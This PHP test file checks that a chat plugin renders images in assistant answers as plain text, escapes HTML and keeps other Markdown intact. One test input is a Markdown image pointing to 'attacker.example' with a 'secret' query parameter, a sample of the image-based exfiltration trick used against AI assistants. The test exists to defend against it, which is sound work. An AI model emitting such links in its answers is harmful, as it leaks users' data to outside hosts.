<?php

use App\Tests\Integration\IntegrationTestCase;
use Illuminate\Support\Str;
use PluggedHost\Neo\Support\Markdown\ImagesAsTextExtension;

require_once __DIR__ . '/../../../plugged-host-core/tests/Support/load-plugin.php';

uses(IntegrationTestCase::class);

beforeEach(fn () => loadPluginForTest('plugged-host-neo'));

// The options neo's chat view renders assistant answers with.
function renderNeoAnswer(string $content): string
{
    return Str::markdown($content, ['html_input' => 'escape', 'allow_unsafe_links' => false], [new ImagesAsTextExtension()]);
}

it('renders images in assistant answers as text, so nothing is fetched', function () {
    $html = renderNeoAnswer('Done. ![status <b>ok</b>](https://attacker.example/?d=secret)');

    expect($html)
        ->not->toContain('<img')
        ->not->toContain('attacker.example')
        ->toContain('status')
        ->not->toContain('<b>');
});

it('keeps the rest of the Markdown', function () {
    $html = renderNeoAnswer("**Bold** and [docs](https://pelican.dev)\n\n- item");

    expect($html)
        ->toContain('<strong>Bold</strong>')
        ->toContain('<a href="https://pelican.dev">docs</a>')
        ->toContain('<li>item</li>');
});

it('uses the extension in the chat view', function () {
    $view = file_get_contents(plugin_path('plugged-host-neo', 'resources/views/livewire/chat.blade.php'));

    expect($view)->toContain('Str::markdown($message->content, [\'html_input\' => \'escape\', \'allow_unsafe_links\' => false], [new \PluggedHost\Neo\Support\Markdown\ImagesAsTextExtension()])');
});
